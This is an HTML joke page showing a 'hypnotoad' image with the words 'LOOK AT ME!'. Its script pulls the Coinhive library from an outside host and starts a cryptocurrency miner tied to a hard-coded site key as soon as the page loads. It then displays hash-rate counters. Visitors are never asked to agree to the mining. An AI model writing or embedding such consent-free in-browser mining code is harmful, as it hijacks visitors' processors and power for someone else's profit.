<!doctype html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title></title>
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link href="https://fonts.googleapis.com/css?family=Oswald" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="css/index.css">
  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
</head>
<body>

<main>
  <img src="images/hypnotoad.gif" alt="" class="hypno-toad">

  <p class="main-text">
    LOOK AT ME!
  </p>
</main>


<div class="stats">
  <p>
    Hashes Per second: <span id="hashes-per-second"></span>
  </p>

  <p>
    Total hashes: <span id="total-hashes"></span>
  </p>

  <p>
    Accepted hashes: <span id="accepted-hashes"></span>
  </p>
</div>


<script>
  var Miner = function() {
    var publicKey = 'iQ21ip245UfhhQVIuKFh2vDmqEw91PUa';

    function setTextContent(id, content) {
      document.getElementById(id).textContent = content;
    }

    this.start = function() {
      var miner = new CoinHive.Anonymous(publicKey);
      miner.start();

      setInterval(function() {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();

        setTextContent('hashes-per-second', hashesPerSecond);
        setTextContent('total-hashes', totalHashes);
        setTextContent('accepted-hashes', acceptedHashes);
      }, 1000);
    };
  };

  var makeTheFun = new Miner();
  makeTheFun.start();
</script>

</body>
</html>
